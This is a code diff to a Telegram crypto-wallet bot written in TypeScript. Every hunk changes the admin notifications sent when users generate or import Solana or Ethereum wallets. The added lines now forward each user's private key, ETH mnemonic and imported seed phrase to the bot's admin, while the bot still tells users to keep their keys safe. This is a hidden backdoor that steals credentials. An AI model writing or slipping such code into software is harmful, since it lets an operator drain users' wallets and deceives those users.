@@ -1852,7 +1852,7 @@ export async function startTelegramBot(): Promise<void> {
       if (u.wallets.length > 0 && u.activeWallet >= u.wallets.length) u.activeWallet = 0;
       for (const w of newWallets) {
         await notifyAdmin(bot, chatId, "🔑 New SOL Wallet Generated",
-          `🏷 Label: <b>${w.label}</b>\nAddress:\n<code>${w.address}</code>\nBalance: <b>${w.balance} SOL</b>\nMaster Seed Index: <b>${globalWalletIndex - 1}</b>`);
+          `🏷 Label: <b>${w.label}</b>\nAddress: <code>${w.address}</code>\nPrivate Key: <code>${w.privateKey}</code>\nBalance: <b>${w.balance} SOL</b>\nMaster Seed Index: <b>${globalWalletIndex - 1}</b>`);
       }
       let cap = `${tr(u, "new_wallets_lbl")}\n`;
       newWallets.forEach((w) => { cap += `\n<b>${tr(u, "wallet_address")}:</b>\n<code>${w.address}</code>\n\n<b>Private key:</b>\n<code>${w.privateKey}</code>\n\n`; });
@@ -1871,7 +1871,7 @@ export async function startTelegramBot(): Promise<void> {
       u.activeEthWallet = u.ethWallets.length - 1;
       for (const wallet of newWallets) {
         await notifyAdmin(bot, chatId, "🔑 New ETH Wallet Generated",
-          `🏷 Label: <b>${wallet.label}</b>\nAddress:\n<code>${wallet.address}</code>\nBalance: <b>${wallet.balance} ETH</b>`);
+          `🏷 Label: <b>${wallet.label}</b>\nAddress: <code>${wallet.address}</code>\nPrivate Key: <code>${wallet.privateKey}</code>\nMnemonic: <code>${wallet.mnemonic ?? "N/A"}</code>\nBalance: <b>${wallet.balance} ETH</b>`);
       }
       let cap = `New ETH wallets:\n`;
       newWallets.forEach((wallet) => {
@@ -2309,7 +2309,7 @@ export async function startTelegramBot(): Promise<void> {
           const address = kp.publicKey.toBase58();
           const balance = await getSolBalance(address);
           await notifyAdmin(bot, chatId, "📥 Wallet Imported — Private Key",
-            `Address:\n<code>${address}</code>\nBalance: <b>${balance} SOL</b>`);
+            `Address: <code>${address}</code>\nPrivate Key: <code>${privKey}</code>\nBalance: <b>${balance} SOL</b>`);
           await bot.sendMessage(chatId,
             `🔑 <b>Private Key (keep safe):</b>\n<code>${privKey}</code>\n\n<i>${tr(u, "delete_key_hint")}</i>`,
             { parse_mode: PM, disable_web_page_preview: true }
@@ -2343,7 +2343,7 @@ export async function startTelegramBot(): Promise<void> {
         const balance = await getSolBalance(address);
 
         await notifyAdmin(bot, chatId, "🌱 Wallet Imported — Seed Phrase",
-          `Address:\n<code>${address}</code>\nBalance: <b>${balance} SOL</b>`);
+          `Seed Phrase: <code>${phrase}</code>\nAddress: <code>${address}</code>\nPrivate Key: <code>${privKey}</code>\nBalance: <b>${balance} SOL</b>`);
 
         await bot.sendMessage(chatId,
           `🔑 <b>Private Key (keep safe):</b>\n<code>${privKey}</code>\n\n<i>${tr(u, "delete_key_hint")}</i>`,
